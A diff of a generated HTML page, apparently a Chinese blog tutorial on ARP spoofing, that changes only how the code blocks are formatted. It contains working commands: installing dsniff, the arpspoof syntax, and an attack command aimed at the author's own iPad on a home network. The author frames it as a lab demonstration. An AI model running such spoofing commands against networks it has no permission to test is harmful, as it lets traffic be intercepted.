@@ -510,16 +510,16 @@
 <ol>
 <li>安装arpspoof。</li>
 </ol>
-<pre><code>apt-get install dsniff
-</code></pre><ol start="2">
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install dsniff</span><br></pre></td></tr></table></figure>
+<ol start="2">
 <li>查寻网卡接口信息。</li>
 </ol>
-<pre><code>ifconfig
-</code></pre><ol start="3">
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+<ol start="3">
 <li>使用srpspoof攻击</li>
 </ol>
-<pre><code>arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host
-</code></pre><ol start="4">
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br></pre></td></tr></table></figure>
+<ol start="4">
 <li>被攻击主机使用ping命令查看被攻击结果。</li>
 </ol>
 <ul>
@@ -534,8 +534,8 @@
 <ul>
 <li>使用攻击命令，攻击我的ipad。</li>
 </ul>
-<pre><code>aspspoof -i wlp8s0 -t 192.168.123.179 192.168.123.1
-</code></pre><p><img src="/img/attack.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aspspoof -i wlp8s0 -t 192.168.123.179 192.168.123.1</span><br></pre></td></tr></table></figure>
+<p><img src="/img/attack.png" alt=""></p>
 <ul>
 <li>在被攻击主机上执行ping命令</li>
 </ul>
